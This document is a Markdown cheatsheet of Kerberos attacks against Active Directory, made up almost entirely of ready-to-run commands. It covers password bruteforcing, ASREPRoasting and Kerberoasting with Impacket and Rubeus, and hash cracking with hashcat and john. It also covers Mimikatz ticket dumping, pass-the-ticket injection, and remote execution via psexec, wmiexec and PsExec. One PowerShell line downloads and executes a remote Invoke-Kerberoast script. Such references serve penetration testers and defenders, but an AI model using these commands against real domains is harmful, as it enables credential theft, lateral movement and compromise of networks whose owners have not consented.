# Kerberos cheatsheet

## Bruteforcing

With [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute):

```shell
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:

```shell
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

## ASREPRoast

With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetNPUsers.py:

```shell
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

With [Rubeus](https://github.com/GhostPack/Rubeus):

```shell
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

Cracking with dictionary of passwords:

```shell
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>
```

## Kerberoasting

* Great reading:
* [https://specterops.gitbook.io/ghostpack/rubeus/roasting](https://specterops.gitbook.io/ghostpack/rubeus/roasting)

With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.py:

```shell
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
```

With [Rubeus](https://github.com/GhostPack/Rubeus):

```shell
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

With **Powershell**:

```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
```

Cracking with dictionary of passwords:

```shell
hashcat -m 13100 --force <TGSs_file> <passwords_file>

john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```

### Harvest tickets from Windows

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```shell
mimikatz # sekurlsa::tickets /export
```

With [Rubeus](https://github.com/GhostPack/Rubeus) in Powershell:

```shell
.\Rubeus dump

# After dump with Rubeus tickets in base64, to write the in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))
```

To convert tickets between Linux/Windows format with [ticket\_converter.py](https://github.com/Zer1t0/ticket\_converter):

```
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

### Using ticket in Linux:

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```shell
# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### Using ticket in Windows

Inject ticket with [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```shell
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):

```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

## Misc

To get NTLM from password:

```python
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

## Tools

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Rubeus](https://github.com/Zer1t0/Rubeus) with brute module
* [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
* [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)
* [tickey](https://github.com/TarlogicSecurity/tickey)
* [ticket\_converter.py](https://github.com/Zer1t0/ticket\_converter)
